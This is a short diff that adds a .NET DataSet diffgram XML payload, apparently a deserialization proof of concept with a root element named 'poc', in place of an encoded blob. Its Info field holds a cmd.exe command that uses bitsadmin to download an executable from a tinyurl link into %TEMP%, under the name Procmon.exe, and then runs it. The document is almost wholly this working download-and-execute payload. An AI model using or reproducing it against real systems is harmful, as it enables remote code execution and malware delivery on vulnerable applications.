@@ -1,1 +1,12 @@
-H4sIACGw6WgC/w3M0W6DIBQA0E9aK5qMRzUKEmujnSi8cXFRJjiTVTr8+u18wHl7FeX3q/AiZEaN3SmG7qmGeK5RF8SQnNLxUJFrohw2VY5XQNMBBC8yT72mbAfE9omuMzgcYCh/KrJcJpqdd/PuZWQvinJTu8bDA68atb+wrb7d2AKuu8tRe+1KVCNm5XbzivBF0pv/f3YwuNUOf8GAj9rxWD5Sywve9DnXPWVeRFcPJrGfpJ+ZETPjXfnBUzuWWYCoeUIUH3Jc7B+KUvlK4AAAAA==
+<diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1">
+  <foo>
+    <bar diffgr:id="Table" msdata:rowOrder="0" diffgr:hasChanges="inserted">
+      <poc xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+        <TestWrapper>
+          <Info>/c bitsadmin /transfer myjob /download /priority normal https://tinyurl.com/Pr0cm0n %TEMP%\Procmon.exe && %TEMP%\Procmon.exe</Info>
+          <Timestamp>2025-07-21T22:19:55Z</Timestamp>
+        </TestWrapper>
+      </poc>
+    </bar>
+  </foo>
+</diffgr:diffgram>
